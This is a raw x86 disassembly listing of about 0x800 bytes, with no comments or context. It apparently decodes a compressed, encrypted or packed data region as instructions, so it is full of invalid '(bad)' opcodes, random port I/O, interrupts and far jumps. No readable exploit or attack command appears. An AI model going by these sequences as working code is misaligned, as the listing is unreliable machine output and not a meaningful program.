  408c8e:	clc    
  408c8f:	aam    0xe9
  408c91:	ror    BYTE PTR [ebx],0xed
  408c94:	add    edx,DWORD PTR [ebx]
  408c96:	shl    bl,cl
  408c98:	mov    edi,0xf2e8f5d7
  408c9d:	icebp  
  408c9e:	icebp  
  408c9f:	(bad)  
  408ca0:	mov    ecx,0x2bbb6fe
  408ca5:	mov    ah,0xd4
  408ca7:	loop   0x408cab
  408ca9:	jecxz  0x408cad
  408cab:	std    
  408cac:	mov    ecx,0xfec0cbeb
  408cb1:	push   es
  408cb2:	lds    eax,FWORD PTR ds:0xcaad120f
  408cb8:	not    ch
  408cba:	out    dx,al
  408cbb:	cmc    
  408cbc:	sar    cl,1
  408cbe:	leave  
  408cbf:	stc    
  408cc0:	(bad)  
  408cc1:	in     al,dx
  408cc2:	mov    ecx,0xc1dbccec
  408cc7:	pop    es
  408cc8:	(bad)  
  408cca:	rcr    esi,1
  408ccc:	or     edi,esi
  408cce:	cli    
  408ccf:	(bad)  
  408cd0:	sti    
  408cd1:	add    edi,edx
  408cd3:	cld    
  408cd4:	add    ebp,esi
  408cd6:	(bad)  
  408cd8:	mov    esi,0xf3d3acac
  408cdd:	lds    edi,FWORD PTR [ecx-0x310a1628]
  408ce3:	in     al,0xcb
  408ce5:	stc    
  408ce6:	add    ecx,edx
  408ce8:	shl    dl,0xf9
  408ceb:	mov    esp,0x4e8f5f5
  408cf0:	or     edi,esi
  408cf2:	enter  0xfde1,0x2
  408cf6:	stos   DWORD PTR es:[edi],eax
  408cf7:	scas   al,BYTE PTR es:[edi]
  408cf8:	scas   al,BYTE PTR es:[edi]
  408cf9:	lods   eax,DWORD PTR ds:[esi]
  408cfa:	loope  0x408ce1
  408cfc:	mov    ah,0xb3
  408cfe:	int    0xf5
  408d00:	repz call 0xbbfc88cf
  408d06:	fdiv   QWORD PTR [esi+0xbfbd8c7]
  408d0c:	ror    BYTE PTR [ecx],cl
  408d0e:	stc    
  408d0f:	sti    
  408d10:	(bad)  
  408d12:	out    0x5,al
  408d14:	iret   
  408d15:	rol    ebp,cl
  408d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d18:	lods   eax,DWORD PTR ds:[esi]
  408d19:	mov    ebp,0xc6eff6d7
  408d1e:	out    dx,al
  408d1f:	out    dx,eax
  408d20:	iret   
  408d21:	into   
  408d22:	mov    ebx,0xc3c3d2e4
  408d27:	int    0xfe
  408d29:	clc    
  408d2a:	add    al,0xf8
  408d2c:	fcmovb st,st(2)
  408d2e:	add    eax,0xcfc60ede
  408d33:	in     al,0xa
  408d35:	or     ebx,ecx
  408d37:	(bad)  
  408d38:	jecxz  0x408cfd
  408d3a:	ret    0xf5ed
  408d3d:	mov    cl,0xe6
  408d3f:	mov    ecx,0xeab6b6b6
  408d44:	neg    eax
  408d46:	repnz pop es
  408d48:	rol    BYTE PTR [eax],0xf4
  408d4b:	loop   0x408d4a
  408d4d:	add    esi,esi
  408d4f:	test   ah,0xb
  408d52:	loopne 0x408d33
  408d54:	shl    edi,0xf3
  408d57:	scas   eax,DWORD PTR es:[edi]
  408d58:	mov    dl,0xc9
  408d5a:	ret    
  408d5b:	loop   0x408d54
  408d5d:	enter  0xd7ea,0xc5
  408d61:	in     al,dx
  408d62:	std    
  408d63:	jmp    0x408d52
  408d65:	clc    
  408d66:	ret    0xd2d3
  408d69:	int    0xe1
  408d6b:	pop    es
  408d6c:	(bad)  
  408d6e:	aam    0xd8
  408d70:	(bad)  
  408d71:	fcmovnu st,st(7)
  408d73:	cld    
  408d74:	in     eax,dx
  408d75:	(bad)  
  408d76:	in     al,0xdf
  408d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d79:	mov    al,0xe3
  408d7b:	mov    dl,0xfb
  408d7d:	rcr    cl,cl
  408d7f:	jmp    0xb5f7456b
  408d84:	rcl    dh,cl
  408d86:	in     al,dx
  408d87:	icebp  
  408d88:	mul    esi
  408d8a:	aad    0x5
  408d8c:	lock xlat BYTE PTR ds:[ebx]
  408d8e:	call   0xf9228e87
  408d93:	(bad)  
  408d95:	jecxz  0x408d89
  408d97:	ret    
  408d98:	lds    ebp,FWORD PTR [esi-0xf0e2338]
  408d9e:	loopne 0x408d87
  408da0:	sar    ch,1
  408da2:	mov    edx,0xedb9e3c8
  408da7:	fdivr  st,st(2)
  408da9:	int    0xe5
  408dab:	rol    DWORD PTR [esi+eax*1],0xc4
  408daf:	add    ah,bh
  408db1:	(bad)  
  408db2:	or     ecx,ecx
  408db4:	add    eax,ebp
  408db6:	les    ebp,FWORD PTR [esi-0x2f2f1133]
  408dbc:	mov    dl,0xee
  408dbe:	out    dx,al
  408dbf:	(bad)  
  408dc2:	out    dx,al
  408dc3:	add    ebx,edx
  408dc5:	cmc    
  408dc6:	mov    bh,0xf7
  408dc8:	xlat   BYTE PTR ds:[ebx]
  408dc9:	clc    
  408dca:	sti    
  408dcb:	lock fcom st(4)
  408dce:	cld    
  408dcf:	lock rol eax,0xc7
  408dd3:	cld    
  408dd4:	repz cli 
  408dd6:	ror    esp,0xf2
  408dd9:	shl    ebp,0xb1
  408ddc:	mov    al,0xb1
  408dde:	enter  0xf9ce,0xd7
  408de2:	int    0x3
  408de4:	mov    ebp,0xdcc1cdcd
  408de9:	icebp  
  408dea:	(bad)
  408ded:	cld    
  408dee:	add    ebp,edi
  408df0:	or     DWORD PTR [ecx],eax
  408df2:	or     dh,al
  408df4:	loop   0x408db6
  408df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df7:	out    dx,al
  408df8:	loope  0x408dea
  408dfa:	lds    ebp,FWORD PTR [ebp-0x373e1e31]
  408e00:	cmc    
  408e01:	fcomp  st(7)
  408e03:	in     al,0xca
  408e05:	add    edx,eax
  408e07:	fmulp  st(5),st
  408e09:	(bad)  
  408e0a:	stc    
  408e0b:	(bad)  
  408e0c:	or     edx,ebp
  408e0e:	out    0xa,eax
  408e10:	jecxz  0x408e0f
  408e12:	call   0xe90d6f11
  408e17:	fsub   QWORD PTR [ebp-0x2a1f0a54]
  408e1d:	in     al,dx
  408e1e:	in     al,dx
  408e1f:	jmp    0x408dfa
  408e21:	(bad)  
  408e23:	lock mov esp,0xc1ccb8cd
  408e29:	lock hlt 
  408e2b:	loopne 0x408e20
  408e2d:	loope  0x408e18
  408e2f:	cmc    
  408e30:	fild   WORD PTR [edi]
  408e32:	add    eax,ebp
  408e34:	loop   0x408e00
  408e36:	in     al,dx
  408e37:	loope  0x408e09
  408e39:	mov    bh,0xe8
  408e3b:	rcl    dh,0xec
  408e3e:	retf   0xe4c6
  408e41:	retf   0xdac4
  408e44:	shr    edx,cl
  408e46:	leave  
  408e47:	mov    ecx,0xc4f7bce0
  408e4c:	rol    ch,1
  408e4e:	cld    
  408e4f:	fdivrp st(7),st
  408e51:	fcomi  st,st(4)
  408e53:	int    0xda
  408e55:	stc    
  408e56:	mov    esp,0xe9cfbccf
  408e5b:	call   0xe8144434
  408e60:	jmp    0xc8f3:0xbdefd8f1
  408e67:	mov    dh,0xd9
  408e69:	mov    ebp,0xf8e5e3d5
  408e6e:	fcomip st,st(5)
  408e70:	retf   
  408e71:	fcmovu st,st(0)
  408e73:	out    dx,al
  408e74:	or     ah,al
  408e76:	shl    edi,1
  408e78:	repz out dx,al
  408e7a:	jmp    0x408e47
  408e7c:	in     eax,dx
  408e7d:	(bad)  
  408e7e:	frstpm(287 only) 
  408e80:	mov    eax,0xf3e4ead0
  408e85:	sti    
  408e86:	mov    ebx,0xd9e6dacc
  408e8b:	ret    
  408e8c:	cmc    
  408e8d:	mov    eax,0xf5e8c6f4
  408e92:	int    0xeb
  408e94:	jmp    0x408e62
  408e96:	out    0xae,eax
  408e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e99:	jmp    0x408e92
  408e9b:	fdiv   QWORD PTR [ecx-0x70c3b4c]
  408ea1:	retf   
  408ea2:	(bad)  
  408ea4:	clc    
  408ea5:	jmp    0xd3c2:0xfaece8f2
  408eac:	rcr    esi,1
  408eae:	jmp    0x408ea7
  408eb0:	xlat   BYTE PTR ds:[ebx]
  408eb1:	(bad)  
  408eb3:	hlt    
  408eb4:	fst    st(2)
  408eb6:	mov    cl,0xed
  408eb8:	out    dx,al
  408eb9:	mov    al,0xe4
  408ebb:	int    0xe0
  408ebd:	rol    ah,cl
  408ebf:	mov    ecx,0xd3efe5e4
  408ec4:	aam    0xfc
  408ec6:	add    edi,DWORD PTR [esi-0x2e000903]
  408ecc:	cmc    
  408ecd:	out    0xf0,eax
  408ecf:	(bad)
  408ed2:	fadd   st,st(2)
  408ed4:	fiadd  WORD PTR ds:0xafdfd8c9
  408eda:	lods   al,BYTE PTR ds:[esi]
  408edb:	into   
  408edc:	in     eax,0xc4
  408ede:	cli    
  408edf:	(bad)  
  408ee0:	test   bl,0xfd
  408ee3:	add    ecx,ebp
  408ee5:	xlat   BYTE PTR ds:[ebx]
  408ee6:	(bad)  
  408ee8:	aad    0xfe
  408eea:	clc    
  408eeb:	int3   
  408eec:	(bad)  
  408eed:	fdivp  st(1),st
  408eef:	add    eax,0xcaedd8d7
  408ef4:	add    cl,dh
  408ef6:	repz retf 
  408ef8:	xlat   BYTE PTR ds:[ebx]
  408ef9:	mov    esp,0xdab7c3d1
  408efe:	mov    bl,0xcf
  408f00:	mov    ecx,0xfdb4edc9
  408f05:	ret    0xbcf8
  408f08:	not    ebx
  408f0a:	fadd   st,st(0)
  408f0c:	aad    0xf8
  408f0e:	or     ebp,edx
  408f10:	fsubr  st,st(5)
  408f12:	loop   0x408f1c
  408f14:	in     eax,0xdc
  408f16:	mov    dl,0xe0
  408f18:	sar    DWORD PTR [edx+eiz*8-0x639243a],cl
  408f1f:	retf   
  408f20:	imul   edx
  408f22:	in     eax,0xd2
  408f24:	repz ret 0xfff3
  408f28:	cld    
  408f29:	(bad)  
  408f2b:	lock add cl,BYTE PTR [edx]
  408f2e:	xlat   BYTE PTR ds:[ebx]
  408f2f:	call   esi
  408f31:	or     ecx,DWORD PTR [edi+ecx*8]
  408f34:	add    al,BYTE PTR [ebx]
  408f36:	mov    esi,0xcde3d6b2
  408f3b:	jmp    0x408f07
  408f3d:	(bad)  
  408f3e:	in     eax,0xcf
  408f40:	(bad)  
  408f41:	mov    edx,0xdacdefde
  408f46:	(bad)  
  408f48:	mov    esp,0xc0e7e105
  408f4d:	out    0xe0,al
  408f4f:	out    0xf5,eax
  408f51:	stc    
  408f52:	out    dx,al
  408f53:	out    dx,eax
  408f54:	repz repz ret 0xcde1
  408f59:	(bad)
  408f5d:	repz (bad) 
  408f60:	iret   
  408f61:	fcmove st,st(1)
  408f63:	(bad)  
  408f65:	add    ebp,esp
  408f67:	rol    DWORD PTR [eax],0xbe
  408f6a:	lds    ecx,FWORD PTR [ebx]
  408f6c:	or     edi,ebx
  408f6e:	(bad)  
  408f6f:	hlt    
  408f70:	retf   0x8cb
  408f73:	or     esp,esp
  408f75:	or     edx,edx
  408f77:	(bad)  
  408f78:	lods   eax,DWORD PTR ds:[esi]
  408f79:	mul    ah
  408f7b:	shr    ebx,0xe7
  408f7e:	(bad)  
  408f7f:	jmp    0xfa03:0xc8edecc9
  408f86:	rcr    ecx,1
  408f88:	cld    
  408f89:	ret    
  408f8a:	in     al,0xdb
  408f8c:	mov    ebp,0xfe9c5d8
  408f91:	fcmovnb st,st(5)
  408f93:	jmp    0x408fa1
  408f95:	iret   
  408f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f97:	(bad)  
  408f99:	loop   0x408f5e
  408f9b:	lods   eax,DWORD PTR ds:[esi]
  408f9c:	mov    ch,0xf7
  408f9e:	rcl    cl,0xdb
  408fa1:	in     eax,0xed
  408fa3:	cld    
  408fa4:	out    dx,al
  408fa5:	(bad)  
  408fa6:	(bad)  
  408fa8:	add    al,BYTE PTR [edi]
  408faa:	inc    bl
  408fac:	std    
  408fad:	cmc    
  408fae:	xlat   BYTE PTR ds:[ebx]
  408faf:	leave  
  408fb0:	pop    es
  408fb1:	clc    
  408fb2:	out    dx,eax
  408fb3:	in     eax,dx
  408fb4:	or     al,0xf8
  408fb6:	(bad)  
  408fb8:	in     eax,0xaf
  408fba:	retf   
  408fbb:	imul   ecx
  408fbd:	test   al,0xb6
  408fbf:	mov    cl,0xed
  408fc1:	in     eax,dx
  408fc2:	mov    ebx,0xe201bbd8
  408fc7:	(bad)  
  408fc9:	add    bl,dh
  408fcb:	mov    ebp,0x5e6bcf5
  408fd0:	add    eax,0xeec6d406
  408fd5:	dec    bl
  408fd7:	leave  
  408fd8:	jmp    0x408f97
  408fda:	aam    0xe2
  408fdc:	in     al,dx
  408fdd:	out    0xf5,eax
  408fdf:	jmp    0xd2c9:0xb9bfdafe
  408fe6:	lock mul bl
  408fe9:	out    dx,al
  408fea:	out    0xbc,al
  408fec:	aad    0xf4
  408fee:	jmp    0xf809:0xecc9e8e0
  408ff5:	out    dx,eax
  408ff6:	iret   
  408ff7:	fcomp  st(4)
  408ff9:	jmp    0xdb225fca
  408ffe:	repz iret 
  409000:	retf   
  409001:	in     al,0xb5
  409003:	add    edi,ecx
  409005:	cld    
  409006:	add    ebx,ebp
  409008:	(bad)  
  40900a:	repnz out 0xda,eax
  40900d:	icebp  
  40900e:	sti    
  40900f:	rol    BYTE PTR [edx],0xcf
  409012:	iret   
  409013:	or     esp,edi
  409015:	out    0xe7,al
  409017:	lods   eax,DWORD PTR ds:[esi]
  409018:	ror    edx,0xea
  40901b:	ret    
  40901c:	int3   
  40901d:	enter  0xe7d2,0xba
  409021:	in     al,dx
  409022:	cld    
  409023:	aam    0xdd
  409025:	into   
  409026:	iret   
  409027:	stc    
  409028:	mov    edi,0xabdd0e1
  40902d:	(bad)
  409030:	dec    DWORD PTR [eax]
  409032:	(bad)  
  409033:	iret   
  409034:	call   0xdd0f5908
  409039:	jmp    0xb0f7:0xd6e1fbf0
  409040:	out    0xef,eax
  409042:	mov    dh,0xd2
  409044:	jecxz  0x40903a
  409046:	hlt    
  409047:	xlat   BYTE PTR ds:[ebx]
  409048:	int3   
  409049:	out    0x6,al
  40904b:	shl    esp,1
  40904d:	stc    
  40904e:	div    edi
  409050:	jmp    0xde30774f
  409055:	jmp    0xb1c5:0xe2eedec1
  40905c:	mov    al,0xd1
  40905e:	mov    dh,0xb1
  409060:	cli    
  409061:	(bad)  
  409062:	rcr    ch,1
  409064:	cmc    
  409065:	mov    ebp,0xf0e7e8bf
  40906a:	int    0xc4
  40906c:	aad    0xe6
  40906e:	fsubp  st(0),st
  409070:	or     bh,bl
  409072:	add    edx,esp
  409074:	add    BYTE PTR ds:0xccc5c2c8,al
  40907a:	repnz jmp 0xd4b4:0xcecdd9f3
  409082:	sti    
  409083:	fcmovbe st,st(4)
  409085:	mov    eax,0x7dad1f2
  40908a:	out    0xcc,al
  40908c:	div    eax
  40908e:	loop   0x40907f
  409090:	iret   
  409091:	out    dx,al
  409092:	add    eax,0xcee7c1e6
  409097:	rcr    dh,cl
  409099:	mov    cl,0xb1
  40909b:	retf   0xedc7
  40909e:	shl    DWORD PTR [edi-0x200194a],1
  4090a4:	fcmovu st,st(5)
  4090a6:	ret    
  4090a7:	icebp  
  4090a8:	add    ebp,ebx
  4090aa:	aam    0xf4
  4090ac:	aam    0xc2
  4090ae:	icebp  
  4090af:	mov    esi,0xcc0007e2
  4090b4:	in     al,dx
  4090b5:	(bad)  
  4090b6:	out    dx,al
  4090b7:	repz mov al,0xcd
  4090ba:	out    dx,eax
  4090bb:	ror    bl,cl
  4090bd:	jmp    0x4090ab
  4090bf:	fsub   st,st(5)
  4090c1:	mov    eax,0xfcdab5cc
  4090c6:	cmc    
  4090c7:	fild   WORD PTR [edi]
  4090c9:	in     eax,0xbb
  4090cb:	in     eax,0xc3
  4090cd:	cmc    
  4090ce:	(bad)  
  4090cf:	in     al,0xfd
  4090d1:	call   0xdd2693db
  4090d6:	out    0xb0,al
  4090d8:	mov    cl,0xd3
  4090da:	div    DWORD PTR [ecx+ecx*8-0x204e490b]
  4090e1:	idiv   BYTE PTR [edx-0xb434336]
  4090e7:	add    edi,eax
  4090e9:	stc    
  4090ea:	rol    BYTE PTR ds:0x102c40a,cl
  4090f0:	lsl    ebx,di
  4090f3:	leave  
  4090f4:	in     al,0xe0
  4090f6:	out    dx,eax
  4090f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f8:	mov    al,0xa4
  4090fa:	shl    dh,0xd3
  4090fd:	mov    bh,0xf7
  4090ff:	aam    0xda
  409101:	enter  0xcdf7,0xd8
  409105:	fstp   TBYTE PTR [eax-0x430ffd43]
  40910b:	aam    0xf0
  40910d:	rcl    al,0xd4
  409110:	(bad)  
  409111:	fiadd  WORD PTR [esi]
  409113:	adc    ecx,DWORD PTR [eax]
  409115:	in     eax,0xce
  409117:	int    0xec
  409119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40911a:	out    0xed,al
  40911c:	aad    0xd2
  40911e:	aad    0xe4
  409120:	div    cl
  409122:	mov    eax,0xcfd9babb
  409127:	in     eax,dx
  409128:	mov    eax,0xc4d4ecf5
  40912d:	mov    eax,0xeaffe3
  409132:	aam    0x6
  409134:	fadd   DWORD PTR [edx]
  409136:	in     eax,0xf1
  409138:	jmp    0xd2f25205
  40913d:	in     eax,dx
  40913e:	(bad)  
  409140:	out    dx,al
  409141:	std    
  409142:	jmp    0xfa3e4e03
  409147:	icebp  
  409148:	ret    0xfbf8
  40914b:	fucom  st(4)
  40914d:	add    ah,ah
  40914f:	add    dl,bh
  409151:	jmp    0x40913e
  409153:	add    al,0xb
  409155:	fisub  WORD PTR [edi-0x2b4e160e]
  40915b:	mov    ch,0xee
  40915d:	test   al,0xb3
  40915f:	mov    edx,0xddd1fdf2
  409164:	mov    eax,0xb8fad602
  409169:	out    dx,al
  40916a:	shr    ebx,cl
  40916c:	lock jmp 0x40914a
  40916f:	mov    esi,0xdeebcade
  409174:	jmp    0xf7e5:0xb3b1cde2
  40917b:	mov    dh,0xc3
  40917d:	mov    bl,0xec
  40917f:	aam    0xf2
  409181:	fmulp  st(0),st
  409183:	fcom   st(2)
  409185:	fdiv   DWORD PTR [edi-0x2a190b1f]
  40918b:	add    al,ch
  40918d:	fcmovne st,st(1)
  40918f:	add    DWORD PTR [edx+ebx*8],eax
  409192:	jecxz  0x4091a0
  409194:	in     eax,0xcb
  409196:	stos   DWORD PTR es:[edi],eax
  409197:	lods   eax,DWORD PTR ds:[esi]
  409198:	retf   0xc2ce
  40919b:	lock call 0xb5405375
  4091a1:	mov    eax,0xdbb8fcbf
  4091a6:	mov    ebp,0xfbe5f6d5
  4091ab:	mul    edi
  4091ad:	jecxz  0x40916e
  4091af:	leave  
  4091b0:	imul   dl
  4091b2:	dec    ecx
  4091b4:	out    0xe6,eax
  4091b6:	out    dx,al
  4091b7:	xlat   BYTE PTR ds:[ebx]
  4091b8:	test   al,0xf6
  4091ba:	jmp    0xc9305c93
  4091bf:	fcomip st,st(4)
  4091c1:	mov    ah,0xed
  4091c3:	in     al,dx
  4091c4:	mov    esp,0xf607e0ed
  4091c9:	sti    
  4091ca:	add    eax,0xfce7fec5
  4091cf:	(bad)  [edx]
  4091d1:	(bad)
  4091d4:	retf   
  4091d5:	fisubr WORD PTR [ecx-0x163f0929]
  4091db:	loope  0x4091ad
  4091dd:	(bad)  
  4091de:	aad    0xd2
  4091e0:	in     eax,0xe8
  4091e2:	fnstsw WORD PTR [ebp-0x3c0e472a]
  4091e8:	in     eax,dx
  4091e9:	sar    ecx,cl
  4091eb:	in     al,dx
  4091ec:	stc    
  4091ed:	ret    0xf407
  4091f0:	add    ecx,esp
  4091f2:	or     edi,ebx
  4091f4:	retf   
  4091f5:	adc    bl,al
  4091f7:	fsubr  st,st(1)
  4091f9:	mov    cl,0xc1
  4091fb:	(bad)  
  4091fc:	fcmovne st,st(0)
  4091fe:	jmp    0xea055ff1
  409203:	mov    ch,0x2
  409205:	ret    
  409206:	icebp  
  409207:	(bad)  
  409208:	inc    BYTE PTR [ecx]
  40920a:	icebp  
  40920b:	(bad)  
  40920c:	stc    
  40920d:	ret    
  40920e:	add    bh,ah
  409210:	neg    bh
  409212:	fisttp QWORD PTR [ebx]
  409214:	or     eax,0xbceef0de
  409219:	mov    bl,0xc9
  40921b:	(bad)  
  40921c:	int3   
  40921d:	repnz enter 0xf9f4,0xed
  409222:	mov    ah,0xb2
  409224:	cli    
  409225:	fsubp  st(1),st
  409227:	loop   0x4091ff
  409229:	out    0xf3,eax
  40922b:	jmp    0x40922e
  40922d:	loopne 0x40920d
  40922f:	test   BYTE PTR [ebx],0xef
  409232:	std    
  409233:	repz rol DWORD PTR [edx],cl
  409236:	jecxz  0x40921b
  409238:	loope  0x4091fa
  40923a:	scas   al,BYTE PTR es:[edi]
  40923b:	mov    dl,0xee
  40923d:	mov    dh,0xee
  40923f:	sti    
  409240:	mov    al,0xc8
  409242:	lds    esi,FWORD PTR [esi-0x2806fd4c]
  409248:	hlt    
  409249:	(bad)  
  40924b:	push   es
  40924c:	add    ebp,edx
  40924e:	(bad)  
  40924f:	stc    
  409250:	cmc    
  409251:	call   0xeb496e19
  409256:	retf   
  409257:	in     eax,dx
  409258:	scas   al,BYTE PTR es:[edi]
  409259:	retf   
  40925a:	out    dx,eax
  40925b:	out    dx,eax
  40925c:	mov    dl,0xed
  40925e:	out    0xc6,eax
  409260:	in     eax,0xd8
  409262:	mov    edi,0xbccdbdd2
  409267:	iret   
  409268:	add    bh,cl
  40926a:	loopne 0x409226
  40926c:	shl    ch,cl
  40926e:	(bad)  
  409270:	(bad)  
  409273:	add    al,0xe3
  409275:	jecxz  0x409258
  409277:	in     eax,0xc4
  409279:	mov    esp,0xd4c4ebc9
  40927e:	mov    ebx,0xefcebfc8
  409283:	(bad)  
  409284:	std    
  409285:	add    ah,bl
  409287:	lock shl esi,0xf8
  40928b:	shl    edi,1
  40928d:	or     cl,BYTE PTR [edx]
  40928f:	push   es
  409290:	add    al,0xd4
  409292:	ret    
  409293:	add    esp,ebx
  409295:	retf   0xace4
  409298:	shl    ebx,cl
  40929a:	icebp  
  40929b:	in     al,dx
  40929c:	test   ebx,0xd1cbaeb3
  4092a2:	std    
  4092a3:	jmp    0x409299
  4092a5:	mov    eax,0xdef3f7ee
  4092aa:	(bad)  
  4092ac:	xlat   BYTE PTR ds:[ebx]
  4092ad:	cmc    
  4092ae:	jecxz  0x40928d
  4092b0:	(bad)  
  4092b2:	(bad)  
  4092b3:	in     eax,dx
  4092b4:	loopne 0x40929c
  4092b6:	(bad)
  4092b9:	sar    BYTE PTR [ebp-0x4f293d2b],0xce
  4092c0:	(bad)
  4092c3:	leave  
  4092c4:	fsubr  st,st(6)
  4092c6:	faddp  st(3),st
  4092c8:	div    ah
  4092ca:	in     eax,0xe2
  4092cc:	fadd   st(3),st
  4092ce:	jmp    0xf60888d7
  4092d3:	or     bl,bh
  4092d5:	push   cs
  4092d6:	scas   eax,DWORD PTR es:[edi]
  4092d7:	scas   al,BYTE PTR es:[edi]
  4092d8:	out    dx,al
  4092d9:	aad    0xf3
  4092db:	mov    al,0xf0
  4092dd:	out    0xca,al
  4092df:	in     eax,0xb1
  4092e1:	out    0xff,al
  4092e3:	fcom   st(5)
  4092e5:	in     eax,dx
  4092e6:	(bad)  
  4092e7:	fidiv  DWORD PTR [ebp-0x3f45192c]
  4092ed:	cld    
  4092ee:	fcmovnb st,st(2)
  4092f0:	pop    es
  4092f1:	(bad)  
  4092f2:	fcmovu st,st(2)
  4092f4:	push   es
  4092f5:	clc    
  4092f6:	scas   eax,DWORD PTR es:[edi]
  4092f7:	mov    dl,0xcd
  4092f9:	mov    esi,0xc8b4e9f1
  4092fe:	stc    
  4092ff:	jmp    0x4092f4
  409301:	(bad)  
  409302:	fistp  QWORD PTR [eax-0x12412815]
  409308:	in     eax,dx
  409309:	clc    
  40930a:	hlt    
  40930b:	int3   
  40930c:	(bad)  
  40930e:	std    
  40930f:	add    ebx,esp
  409311:	idiv   dh
  409313:	fld    QWORD PTR ds:0xecb1edc9
  409319:	jmp    0xc22561f2
  40931e:	out    0xb4,eax
  409320:	icebp  
  409321:	int3   
  409322:	mov    bh,0xd1
  409324:	int    0xc3
  409326:	fcmovu st,st(3)
  409328:	fcmovnbe st,st(2)
  40932a:	(bad)
  40932d:	in     al,0xc0
  40932f:	neg    dl
  409331:	retf   0xc2dc
  409334:	shl    ebx,cl
  409336:	repz shl ebp,0xf7
  40933a:	shl    eax,0xf7
  40933d:	int3   
  40933e:	jmp    0xdcf3:0xeccdadc4
  409345:	mov    eax,0xe3d9b8e3
  40934a:	xrelease mov DWORD PTR [edx*8-0x29f90737],0xe5ebd906
  409356:	stos   BYTE PTR es:[edi],al
  409357:	out    0xcb,eax
  409359:	lods   al,BYTE PTR ds:[esi]
  40935a:	(bad)  
  40935b:	hlt    
  40935c:	mov    ch,0xe4
  40935e:	into   
  40935f:	stc    
  409360:	leave  
  409361:	into   
  409362:	out    dx,al
  409363:	mov    esp,0xd9fabbbb
  409368:	cmc    
  409369:	rol    BYTE PTR [eax],1
  40936b:	out    0xdb,al
  40936d:	(bad)  
  40936f:	dec    DWORD PTR [edi]
  409371:	loope  0x40937c
  409373:	aam    0xfd
  409375:	add    eax,0xa8b1c3e8
  40937a:	mov    cl,0xd4
  40937c:	(bad)  
  40937d:	in     eax,0xef
  40937f:	in     eax,dx
  409380:	aam    0xd1
  409382:	sti    
  409383:	retf   0xcfd8
  409386:	cld    
  409387:	shl    BYTE PTR [ebp-0x708fb30],0x5
  40938e:	retf   0xc9e4
  409391:	fcmovnu st,st(4)
  409393:	repz retf 
  409395:	fcomp  st(7)
  409397:	int    0xa5
  409399:	aad    0xc9
  40939b:	in     al,0xf1
  40939d:	sti    
  40939e:	mov    ah,0xba
  4093a0:	faddp  st(5),st
  4093a2:	jmp    0x40939b
  4093a4:	cmc    
  4093a5:	mov    esi,0xb4d3fcde
  4093aa:	hlt    
  4093ab:	add    esi,esp
  4093ad:	fucomip st,st(0)
  4093af:	jmp    0xff0a9878
  4093b4:	or     eax,0xe3d8a808
  4093b9:	loopne 0x4093a7
  4093bb:	repz repz aam 0xaf
  4093bf:	cli    
  4093c0:	fdiv   st,st(7)
  4093c2:	cli    
  4093c3:	retf   
  4093c4:	into   
  4093c5:	lock ror bh,cl
  4093c8:	(bad)  
  4093ca:	rcl    ah,cl
  4093cc:	(bad)  
  4093ce:	fucom  st(6)
  4093d0:	loop   0x4093d0
  4093d2:	aad    0xa
  4093d4:	enter  0xb30b,0xa9
  4093d8:	retf   0xe6dd
  4093db:	rcl    bh,cl
  4093dd:	sti    
  4093de:	(bad)  
  4093df:	xlat   BYTE PTR ds:[ebx]
  4093e0:	(bad)  
  4093e1:	jmp    0xc101:0xbabaffda
  4093e8:	cmc    
  4093e9:	cld    
  4093ea:	fdivp  st(4),st
  4093ec:	out    0xc4,al
  4093ee:	sti    
  4093ef:	hlt    
  4093f0:	retf   
  4093f1:	jmp    0xbff2:0xf2e2030f
  4093f8:	call   0xd6325db9
  4093fd:	fincstp 
  4093ff:	mov    dh,0xe5
  409401:	(bad)  
  409402:	mov    ebx,0xf0b0d0fe
  409407:	lock mov ecx,0xd20400bd
  40940d:	add    dh,ch
  40940f:	(bad)  
  409410:	(bad)  
  409411:	stc    
  409412:	mov    DWORD PTR [ebx],0xcde20107
  409418:	(bad)
  40941b:	aam    0xd0
  40941d:	rcl    ah,1
  40941f:	fsubr  DWORD PTR [ebp+0x3d1ccb4]
  409425:	cli    
  409426:	hlt    
  409427:	cli    
  409428:	rcl    cl,0xd7
  40942b:	test   BYTE PTR [edx],0xe5
  40942e:	hlt    
  40942f:	aad    0xcb
  409431:	(bad)  
  409432:	jecxz  0x409432
  409434:	jmp    0xec215811
  409439:	mov    dh,0xb0
  40943b:	shl    DWORD PTR [ebp-0x1a2b182c],0xe4
  409442:	(bad)  
  409444:	(bad)  
  409445:	fcmovne st,st(7)
  409447:	div    edx
  409449:	call   esi
  40944b:	div    dh
  40944d:	add    ch,bl
  40944f:	or     ebp,esi
  409451:	cli    
  409452:	in     eax,0xef
  409454:	clc    
  409455:	jmp    0x40940f
  409457:	mov    cl,0xdd
  409459:	out    0xd7,al
  40945b:	in     eax,dx
  40945c:	aad    0xeb
  40945e:	(bad)  
  40945f:	(bad)  
  409461:	rcl    ebp,cl
  409463:	lock div edi
  409466:	sar    edx,cl
  409468:	out    dx,eax
  409469:	lock shl al,0xeb
  40946d:	add    eax,0xdabd0203
  409472:	add    eax,0xdfe00fe7
  409477:	enter  0xe2ea,0xd2
  40947b:	mov    esp,0xbafaf3f2
  409480:	repz out dx,eax
  409482:	ror    dh,1
  409484:	iret   
  409485:	mov    ecx,0xf7ffd3d5
  40948a:	(bad)
  40948d:	test   BYTE PTR [esi],0xc8
  409490:	enter  0xfbce,0xd8
  409494:	adc    edi,edi
  409496:	mov    esi,0xe8ccd3af
  40949b:	jmp    0xcbef:0xc0afe4c5
  4094a2:	fcmovnu st,st(4)
  4094a4:	out    dx,al
  4094a5:	iret   
  4094a6:	xlat   BYTE PTR ds:[ebx]
  4094a7:	mov    esp,0xd9c1c0fa
  4094ac:	push   ebp
  4094ae:	retf   
  4094af:	pmulhuw mm7,mm5
  4094b2:	loop   0x409490
  4094b4:	in     eax,dx
  4094b5:	or     ebx,edx
  4094b7:	mov    al,0xf3
  4094b9:	iret   
  4094ba:	mov    dl,0xe3
  4094bc:	cli    
  4094bd:	aad    0xf8
  4094bf:	(bad)  
  4094c0:	in     eax,dx
  4094c1:	hlt    
  4094c2:	cld    
  4094c3:	in     eax,dx
  4094c4:	mov    ah,0xfc
